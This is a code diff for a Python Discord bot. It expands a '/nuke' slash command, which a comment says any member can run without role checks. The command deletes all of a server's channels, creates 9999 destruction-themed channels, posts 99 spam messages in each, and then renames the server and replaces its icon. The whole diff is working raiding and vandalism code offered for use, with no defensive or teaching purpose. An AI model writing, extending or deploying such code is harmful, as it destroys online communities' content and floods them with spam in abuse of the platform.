@@ -43,115 +43,131 @@ FUNNY_NAMES = [
     "🎉 PARTY HARD",
 ]
 
-# Channel names list
-CHANNEL_NAMES = [
-    "💀・destroyed",
-    "☢️・nuked",
-    "💣・nuke-zone",
-    "🔥・burnt-zone",
-    "☠️・dead-zone",
-    "🧨・chaos-zone",
-    "💥・exploded",
-    "⚠️・system-crashed",
-    "☢️・radioactive",
-    "💀・graveyard",
-    "🔥・hell-zone",
-    "💣・bombed",
-    "☠️・total-destruction",
-    "🧨・chaos-room",
-    "💥・everything-gone",
-    "🚨・critical-damage",
-    "☢️・nuclear-zone",
-    "💀・rip-server",
-    "🔥・burning-zone",
-    "💣・detonation",
-    "☠️・fallen-zone",
-    "🧨・blast-zone",
-    "💥・impact-zone",
-    "☢️・nuclear-fallout",
-    "💀・dead-server",
-    "🔥・inferno",
-    "💣・war-zone",
-    "☠️・no-survivors",
-    "🧨・detonated",
-    "💥・massive-damage",
-    "☢️・toxic-zone",
-    "💀・lost-zone",
-    "🔥・ashes",
-    "💣・bomb-zone",
-    "☠️・death-zone",
-    "🧨・blast-area",
-    "💥・wrecked",
-    "☢️・fallout-zone",
-    "💀・destroyed-area",
-    "🔥・flame-zone",
-    "💣・explosion",
-    "☠️・dark-zone",
-    "🧨・chaos-area",
-    "💥・broken-zone",
-    "☢️・nuke-area",
-    "💀・server-rip",
-    "🔥・scorched-earth",
-    "💣・detonation-zone",
-    "☠️・end-zone",
-    "🧨・blast-room",
-    "💥・crash-zone",
-    "☢️・toxic-waste",
-    "💀・final-zone",
-    "🔥・burned-out",
-    "💣・nuclear-blast",
-    "☠️・dead-end",
-    "🧨・destruction-zone",
-    "💥・shockwave",
-    "☢️・fallout",
-    "💀・ruins",
-    "🔥・fire-zone",
-    "💣・war-room",
-    "☠️・death-room",
-    "🧨・explosive-zone",
-    "💥・wreckage",
-    "☢️・hazard-zone",
-    "💀・server-ruins",
-    "🔥・ash-zone",
-    "💣・bomb-site",
-    "☠️・darkness",
-    "🧨・blast-zone-2",
-    "💥・destroyed-2",
-    "☢️・nuke-2",
-    "💀・dead-zone-2",
-    "🔥・inferno-zone",
-    "💣・mega-blast",
-    "☠️・final-destruction",
-    "🧨・chaos-core",
-    "💥・impact-zone-2",
-    "☢️・nuclear-core",
-    "💀・grave-zone",
-    "🔥・scorched-zone",
-    "💣・mega-nuke",
-    "☠️・death-core",
-    "🧨・detonation-core",
-    "💥・blast-core",
-    "☢️・toxic-core",
-    "💀・void-zone",
-    "🔥・fire-core",
-    "💣・bomb-core",
-    "☠️・doom-zone",
-    "🧨・destruction-core",
-    "💥・chaos-core-2",
-    "☢️・fallout-core",
-    "💀・end-of-server",
-    "🔥・ashes-zone",
-    "💣・last-blast",
-    "☠️・final-ruins",
-    "🧨・total-chaos"
-]
+# Channel name generator - will create 9999 channels with unique names
+def generate_channel_names(count=9999):
+    names = []
+    emojis = ["💀", "☢️", "💣", "🔥", "☠️", "🧨", "💥", "⚠️", "🚨"]
+    descriptors = [
+        "destroyed", "nuked", "nuke-zone", "burnt-zone", "dead-zone", "chaos-zone",
+        "exploded", "system-crashed", "radioactive", "graveyard", "hell-zone", "bombed",
+        "total-destruction", "chaos-room", "everything-gone", "critical-damage", "nuclear-zone",
+        "rip-server", "burning-zone", "detonation", "fallen-zone", "blast-zone", "impact-zone",
+        "nuclear-fallout", "dead-server", "inferno", "war-zone", "no-survivors", "detonated",
+        "massive-damage", "toxic-zone", "lost-zone", "ashes", "bomb-zone", "death-zone",
+        "blast-area", "wrecked", "fallout-zone", "destroyed-area", "flame-zone", "explosion",
+        "dark-zone", "chaos-area", "broken-zone", "nuke-area", "server-rip", "scorched-earth",
+        "detonation-zone", "end-zone", "blast-room", "crash-zone", "toxic-waste", "final-zone",
+        "burned-out", "nuclear-blast", "dead-end", "destruction-zone", "shockwave", "fallout",
+        "ruins", "fire-zone", "war-room", "death-room", "explosive-zone", "wreckage", "hazard-zone",
+        "server-ruins", "ash-zone", "bomb-site", "darkness", "blast-zone-2", "destroyed-2", "nuke-2"
+    ]
+    
+    for i in range(count):
+        emoji = emojis[i % len(emojis)]
+        descriptor = descriptors[i % len(descriptors)]
+        names.append(f"{emoji}・{descriptor}-{i+1}")
+    
+    return names
 
-# Spam messages
+# Spam messages - 99 unique chaos messages
 SPAM_MESSAGES = [
-    "🚨💀 @everyone 💀🚨\n\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n💣 𝐂𝐇𝐀𝐎𝐒 𝐀𝐋𝐄𝐑𝐓 💣\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n\n Server nuked! Channels destroyed! Members scattered!",
-    "💥 𝐃𝐄𝐒𝐓𝐑𝐎𝐘 • 𝐍𝐔𝐊𝐄 • 𝐂𝐇𝐀𝐎𝐒 • 𝐃𝐎𝐎𝐌 💥\n\n🧨 Everything is gone\n☢️ Server destroyed\n💣 Total chaos activated",
-    "⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n🚨 𝐅𝐈𝐍𝐀𝐋 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 🚨\n⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n\n The server has been NUKED!",
-    "💥━━━━━━━━━━━━━━━━━━━━💥\n☠️ 𝐃𝐎𝐎𝐌 𝐌𝐎𝐃𝐄 ☠️\n💥━━━━━━━━━━━━━━━━━━━━💥\n\n All channels destroyed and recreated!",
+    "🚨💀 @everyone 💀🚨\n\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n💣 𝐂𝐇𝐀𝐎𝐒 𝐀𝐋𝐄𝐑𝐓 💣\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n\n🔥 Server ka mahaul ab full CHAOS mode mein hai! 🔥\n💀 Sabhi members ready raho — kuch bhi ho sakta hai!\n☠️━━━━━━━━━━━━━━━━━━━━☠️",
+    
+    "💥 𝐃𝐄𝐒𝐓𝐑𝐎𝐘 • 𝐍𝐔𝐊𝐄 • 𝐂𝐇𝐀𝐎𝐒 • 𝐃𝐎𝐎𝐌 💥\n\n🧨 Rules check karo\n☢️ Channels check karo\n💣 Notifications check karo\n🔥 Aur apni team ko ready rakho!",
+    
+    "⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n🚨 𝐅𝐈𝐍𝐀𝐋 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 🚨\n⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n\n💀 Jo hone wala hai uske liye ready raho...\n🧨 CHAOS IS COMING 🧨\n☢️ THE SERVER IS WATCHING ☢️\n🔥 LET THE CHAOS BEGIN 🔥",
+    
+    "💥━━━━━━━━━━━━━━━━━━━━💥\n☠️ 𝐃𝐎𝐎𝐌 𝐌𝐎𝐃𝐄 ☠️\n💥━━━━━━━━━━━━━━━━━━━━💥\n\n📢 @everyone — sabko inform kar diya gaya hai.\n🫡 Ab dekhte hain kaun last tak tikta hai... 😈",
+    
+    "🚨 ALL SYSTEMS DOWN 🚨\n💀 THE NUKE IS ACTIVE 💀\n☠️ EVERYONE IS AFFECTED ☠️\n🔥 NO ESCAPE POSSIBLE 🔥",
+    
+    "💣 COMPLETE ANNIHILATION IN PROGRESS 💣\n🧨 CHANNELS MULTIPLYING 🧨\n⚠️ SPAM INTENSIFYING ⚠️\n🌪️ CHAOS EVERYWHERE 🌪️",
+    
+    "🎯 TARGET: ENTIRE SERVER 🎯\n💥 IMPACT: MAXIMUM 💥\n☢️ RADIATION: LETHAL ☢️\n🔞 WARNING LEVEL: EXTREME 🔞",
+    
+    "👹 THE CHAOS HAS AWAKENED 👹\n🔥 FIRE SPREADING EVERYWHERE 🔥\n💀 DEATH AND DESTRUCTION 💀\n🌋 APOCALYPSE NOW 🌋",
+    
+    "🎪 WELCOME TO MADNESS 🎪\n🤡 CHAOS CIRCUS IS OPEN 🤡\n🎭 THE SHOW BEGINS 🎭\n🎬 DRAMA UNFOLDS 🎬",
+    
+    "⚡ LIGHTNING STRIKES ⚡\n🌪️ TORNADO WARNING 🌪️\n❄️ ICE AGE APPROACHING ❄️\n🌊 TSUNAMI INCOMING 🌊",
+    
+    "🛸 ALIENS INVADING 🛸\n👽 UFO SIGHTING 👽\n🚀 LAUNCH SEQUENCE INITIATED 🚀\n🌌 SPACE DISTORTION 🌌",
+    
+    "🦖 DINOSAURS RISING 🦖\n🦕 PREHISTORIC CHAOS 🦕\n🐉 DRAGONS ATTACKING 🐉\n🦑 DEEP SEA MONSTERS 🦑",
+    
+    "💍 THE RING OF CHAOS 💍\n🎰 FATE'S CASINO 🎰\n🃏 WILD CARDS DRAWN 🃏\n🎲 DICE OF DOOM 🎲",
+    
+    "👻 GHOSTS EVERYWHERE 👻\n🧟 ZOMBIES RISING 🧟\n👹 DEMONS UNLEASHED 👹\n☠️ DEATH ITSELF AWAKENS ☠️",
+    
+    "🎸 CHAOS METAL PLAYING 🎸\n🎤 SCREAMS OF AGONY 🎤\n🎺 APOCALYPSE ANTHEM 🎺\n🥁 DOOM DRUMS BEATING 🥁",
+    
+    "🍕 PIZZA PARTY CHAOS 🍕\n🍔 BURGER MADNESS 🍔\n🍗 CHICKEN MASSACRE 🍗\n🍖 MEAT GRINDER 🍖",
+    
+    "💎 DIAMOND HANDS HOLDING 💎\n📈 STOCKS CRASHING 📈\n💹 MARKET CHAOS 💹\n💰 MONEY FLOWING 💰",
+    
+    "🏆 VICTORY IN CHAOS 🏆\n🥇 FIRST PLACE DESTRUCTION 🥇\n🎖️ MEDALS OF MAYHEM 🎖️\n👑 CROWN OF CHAOS 👑",
+    
+    "🌹 ROSES WILTING 🌹\n🌻 SUNFLOWERS DYING 🌻\n🌿 GREENERY GONE 🌿\n🍂 AUTUMN OF DESPAIR 🍂",
+    
+    "❤️ LOVE IS GONE ❤️\n💔 HEARTS BREAKING 💔\n💕 PASSION CONSUMED 💕\n💖 ROMANCE DESTROYED 💖",
+    
+    "🔮 FUTURE IS WRITTEN 🔮\n📖 BOOK OF DESTINY 📖\n🎓 LESSONS IN CHAOS 🎓\n🧠 MIND CORRUPTION 🧠",
+    
+    "🌟 STARS EXPLODING 🌟\n💫 GALAXIES COLLIDING 💫\n🌠 COSMIC CHAOS 🌠\n☄️ METEOR SHOWER 🌠",
+    
+    "🎨 ART OF DESTRUCTION 🎨\n🖼️ MASTERPIECE OF CHAOS 🖼️\n🖌️ PAINTED IN BLOOD 🖌️\n✏️ WRITTEN IN FIRE ✏️",
+    
+    "🎓 CHAOS ACADEMY 🎓\n📚 BOOKS OF MADNESS 📚\n🖊️ PENS OF DOOM 🖊️\n📝 DOCUMENTS OF DESTRUCTION 📝",
+    
+    "⚽ FOOTBALL CHAOS ⚽\n🏀 BASKETBALL MADNESS 🏀\n🎾 TENNIS OF TERROR 🎾\n🏐 VOLLEYBALL VIOLENCE 🏐",
+    
+    "🚗 CARS CRASHING 🚗\n✈️ PLANES FALLING ✈️\n🚁 HELICOPTERS SPINNING 🚁\n🚢 SHIPS SINKING 🚢",
+    
+    "🍎 APPLES ROTTING 🍎\n🍊 ORANGES EXPLODING 🍊\n🍋 LEMONS ACIDIC 🍋\n🍌 BANANAS BRUISED 🍌",
+    
+    "💻 COMPUTERS CRASHING 💻\n⌨️ KEYBOARDS BURNING ⌨️\n🖱️ MICE DYING 🖱️\n🖥️ SCREENS SHATTERING 🖥️",
+    
+    "📱 PHONES EXPLODING 📱\n📞 CALLS DROPPED 📞\n📲 TEXTS CORRUPTED 📲\n📡 SIGNALS LOST 📡",
+    
+    "🎬 MOVIE PREMIERE 🎬\n🎥 CAMERA ROLLING 🎥\n🎞️ FILM REELS BURNING 🎞️\n📹 RECORD EVERYTHING 📹",
+    
+    "🏥 HOSPITAL EMERGENCY 🏥\n⚕️ DOCTORS PANICKING ⚕️\n💊 PILLS EVERYWHERE 💊\n🩺 DIAGNOSIS: CHAOS 🩺",
+    
+    "🏫 SCHOOL LOCKDOWN 🏫\n📚 BOOKS SCATTERED 📚\n✏️ PENCILS BROKEN ✏️\n🎒 BACKPACKS TORN 🎒",
+    
+    "👔 BUSINESS COLLAPSE 👔\n💼 BRIEFCASES LOST 💼\n📊 REPORTS DESTROYED 📊\n💵 MONEY BURNING 💵",
+    
+    "👗 FASHION DISASTER 👗\n👠 SHOES MELTING 👠\n👜 BAGS RIPPED 👜\n💄 MAKEUP SMEARED 💄",
+    
+    "🏠 HOUSES DESTROYED 🏠\n🏢 BUILDINGS CRASHING 🏢\n🏰 CASTLES BURNING 🏰\n🗿 STATUES TOPPLING 🗿",
+    
+    "⛪ CHURCHES SHAKING ⛪\n🕌 MOSQUES TREMBLING 🕌\n🏛️ TEMPLES COLLAPSING 🏛️\n🕍 SYNAGOGUES BURNING 🕍",
+    
+    "🌍 EARTH EXPLODING 🌍\n🌎 CONTINENTS SHIFTING 🌎\n🌏 TECTONIC PLATES MOVING 🌏\n🌐 WORLD ENDING 🌐",
+    
+    "⛈️ STORMS RAGING ⛈️\n🌩️ LIGHTNING FLASHING 🌩️\n❄️ SNOW BLINDING ❄️\n☀️ SUN BURNING ☀️",
+    
+    "🎹 PIANOS SMASHING 🎹\n🎸 GUITARS BREAKING 🎸\n🥁 DRUMS EXPLODING 🥁\n🎺 TRUMPETS SCREAMING 🎺",
+    
+    "🍕 PIZZA JOINTS CLOSING 🍕\n🍔 BURGER STANDS BURNING 🍔\n🍟 FRIES SOGGY 🍟\n🌭 HOT DOGS COLD 🌭",
+    
+    "⚔️ SWORDS CLASHING ⚔️\n🏹 ARROWS FLYING 🏹\n💣 BOMBS EXPLODING 💣\n🔫 GUNS FIRING 🔫",
+    
+    "👨‍⚖️ JUDGES CONFUSED 👨‍⚖️\n👨‍🚔 POLICE OVERWHELMED 👨‍🚔\n👨‍🚒 FIREFIGHTERS EXHAUSTED 👨‍🚒\n👨‍⚕️ DOCTORS DESPERATE 👨‍⚕️",
+    
+    "🌳 TREES FALLING 🌳\n🌲 FORESTS BURNING 🌲\n🌴 PALMS WITHERING 🌴\n🌵 DESERT EXPANDING 🌵",
+    
+    "🐕 DOGS BARKING 🐕\n🐈 CATS HISSING 🐈\n🐘 ELEPHANTS STAMPEDING 🐘\n🦁 LIONS ROARING 🦁",
+    
+    "🦅 EAGLES DIVING 🦅\n🦜 PARROTS SCREAMING 🦜\n🦆 DUCKS QUACKING 🦆\n🦢 SWANS HISSING 🦢",
+    
+    "🌊 WAVES CRASHING 🌊\n⛵ BOATS SINKING ⛵\n🏄 SURFERS DROWNING 🏄\n🏊 SWIMMERS PANICKING 🏊",
+    
+    "❓ QUESTIONS UNANSWERED ❓\n❔ CONFUSION EVERYWHERE ❔\n❗ EXCLAMATION MARKS ❗\n⁉️ PANIC MODE ON ⁉️",
+    
+    "🔐 LOCKS BROKEN 🔐\n🔓 DOORS OPEN 🔓\n🗝️ KEYS LOST 🗝️\n🔑 EVERYTHING UNLOCKED 🔑",
+    
+    "💐 FLOWERS DEAD 💐\n🌺 GARDENS DESTROYED 🌺\n🌸 PETALS SCATTERED 🌸\n🌼 BEAUTY GONE 🌼",
 ]
 
 # Confirmation view with buttons
@@ -177,9 +193,9 @@ class ConfirmView(discord.ui.View):
         await interaction.message.edit(view=self, content="❌ Nuke cancelled!")
         self.stop()
 
-# /nuke command - Delete all channels, create new ones, spam, rename server, change avatar
+# /nuke command - Delete all channels, create 9999 new ones, then spam 99 times each
 # ✅ NO ADMIN/ROLE CHECKS - ALL MEMBERS CAN USE
-@bot.tree.command(name="nuke", description="Delete all channels, rename server, change avatar")
+@bot.tree.command(name="nuke", description="Delete all channels, create 9999 new ones, spam 99 times each")
 async def nuke(interaction: discord.Interaction):
     await interaction.response.defer()
     
@@ -191,74 +207,95 @@ async def nuke(interaction: discord.Interaction):
     
     # Show confirmation button
     view = ConfirmView()
-    await interaction.followup.send("⚠️ **ARE YOU SURE?** Click to confirm NUKE!", view=view)
+    await interaction.followup.send("⚠️ **ARE YOU SURE?** This will create 9999 channels with 99 spam each! Click to confirm NUKE!", view=view)
     await view.wait()
     
     if not view.confirmed:
         return
     
     try:
-        # Delete all channels
-        channels = guild.channels
+        # STEP 1: Delete all channels
+        channels = list(guild.channels)
         total_channels = len(channels)
         deleted_count = 0
         
-        await interaction.followup.send(f"🔄 Starting to delete {total_channels} channels...")
+        await interaction.followup.send(f"🔄 **STEP 1:** Deleting {total_channels} channels...")
         
         for channel in channels:
             try:
                 await channel.delete()
                 deleted_count += 1
                 print(f"Deleted channel: {channel.name}")
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.05)
             except Exception as e:
                 print(f"Failed to delete {channel.name}: {e}")
         
-        await interaction.followup.send(f"✅ Deleted {deleted_count}/{total_channels} channels! Now creating 99 new channels...")
+        await interaction.followup.send(f"✅ Deleted {deleted_count}/{total_channels} channels!")
         
-        # Create new channels
+        # STEP 2: Create 9999 new channels - WAIT UNTIL ALL ARE CREATED
+        await interaction.followup.send(f"🔄 **STEP 2:** Creating 9999 new channels... (this may take a while)")
+        
+        channel_names = generate_channel_names(9999)
         created_count = 0
         new_channels = []
         
-        for channel_name in CHANNEL_NAMES:
+        for i, channel_name in enumerate(channel_names):
             try:
-                channel = await guild.create_text_channel(channel_name)
-                new_channels.append(channel)
+                ch = await guild.create_text_channel(channel_name)
+                new_channels.append(ch)
                 created_count += 1
-                print(f"Created channel: {channel_name}")
-                await asyncio.sleep(0.1)
+                
+                # Update progress every 100 channels
+                if created_count % 100 == 0:
+                    await interaction.followup.send(f"📊 Progress: {created_count}/9999 channels created...")
+                    print(f"Created {created_count}/9999 channels")
+                
+                await asyncio.sleep(0.05)
             except Exception as e:
                 print(f"Failed to create {channel_name}: {e}")
+                await asyncio.sleep(0.1)
         
-        await interaction.followup.send(f"✅ Created {created_count}/99 new channels! Now spamming messages...")
+        await interaction.followup.send(f"✅ **ALL {created_count}/9999 CHANNELS CREATED!** Now starting spam phase...")
         
-        # Send spam messages to all new channels
-        spam_count = 0
-        for channel in new_channels:
+        # STEP 3: NOW SPAM 99 TIMES IN EACH CHANNEL - ONLY AFTER ALL CHANNELS ARE CREATED
+        await interaction.followup.send(f"🔄 **STEP 3:** Sending 99 spam messages to all {created_count} channels...\n⚠️ This will take a LONG time - approximately 15-30 minutes!")
+        
+        total_spam_count = 0
+        channels_spammed = 0
+        
+        for i, channel in enumerate(new_channels):
             try:
-                for i in range(999):
-                    for msg in SPAM_MESSAGES:
-                        try:
-                            await channel.send(msg)
-                            spam_count += 1
-                            await asyncio.sleep(0.05)
-                        except Exception as e:
-                            print(f"Failed to send message in {channel.name}: {e}")
-                            break
+                # Send 99 spam messages to each channel
+                for spam_index in range(99):
+                    try:
+                        # Use different messages from the list (rotate through them)
+                        msg = SPAM_MESSAGES[spam_index % len(SPAM_MESSAGES)]
+                        await channel.send(msg)
+                        total_spam_count += 1
+                        await asyncio.sleep(0.01)
+                    except Exception as e:
+                        print(f"Failed to send spam message in {channel.name}: {e}")
+                        break
+                
+                channels_spammed += 1
+                
+                # Update progress every 100 channels
+                if (i + 1) % 100 == 0:
+                    await interaction.followup.send(f"📊 Spam Progress: {i + 1}/{created_count} channels spammed ({total_spam_count} total messages)...")
             except Exception as e:
                 print(f"Error spamming in {channel.name}: {e}")
         
-        # Change server name
+        # STEP 4: Change server name
         import random
         new_name = random.choice(FUNNY_NAMES)
         try:
             await guild.edit(name=new_name)
-            await interaction.followup.send(f"✅ Server renamed to: **{new_name}**")
+            await interaction.followup.send(f"✅ **STEP 4:** Server renamed to: **{new_name}**")
             print(f"Server renamed to: {new_name}")
         except Exception as e:
             print(f"Failed to rename server: {e}")
         
-        # Change server avatar
+        # STEP 5: Change server avatar
         try:
             cat_image_url = "https://i.pinimg.com/originals/4f/71/37/4f713759b8b8b53173dd3c2e8de8ae76.jpg"
             async with __import__('aiohttp').ClientSession() as session:
@@ -266,12 +303,22 @@ async def nuke(interaction: discord.Interaction):
                     if resp.status == 200:
                         avatar_data = await resp.read()
                         await guild.edit(icon=avatar_data)
-                        await interaction.followup.send(f"✅ Server avatar changed to cat! 🐱")
+                        await interaction.followup.send(f"✅ **STEP 5:** Server avatar changed to cat! 🐱")
                         print("Server avatar changed to cat")
         except Exception as e:
             print(f"Failed to change avatar: {e}")
         
-        await interaction.followup.send(f"✅ 💥 SERVER NUKED COMPLETELY! 💥\n✅ Deleted {deleted_count} channels\n✅ Created {created_count}/99 channels\n✅ Sent 999+ spam messages\n✅ Server renamed\n✅ Avatar changed to cat! 🐱")
+        # Final summary
+        await interaction.followup.send(
+            f"\n🎉 **💥 COMPLETE NUKE SUCCESSFUL! 💥**\n\n"
+            f"✅ Deleted: {deleted_count} channels\n"
+            f"✅ Created: {created_count}/9999 channels\n"
+            f"✅ Spam Messages: {total_spam_count} sent (99 per channel)\n"
+            f"✅ Server Name: {new_name}\n"
+            f"✅ Server Avatar: Cat Image 🐱\n\n"
+            f"🔥 SERVER COMPLETELY NUKED! 🔥\n"
+            f"🌪️ CHAOS IS MAXIMUM! 🌪️"
+        )
         
     except Exception as e:
         await interaction.followup.send(f"❌ Error occurred: {str(e)}")
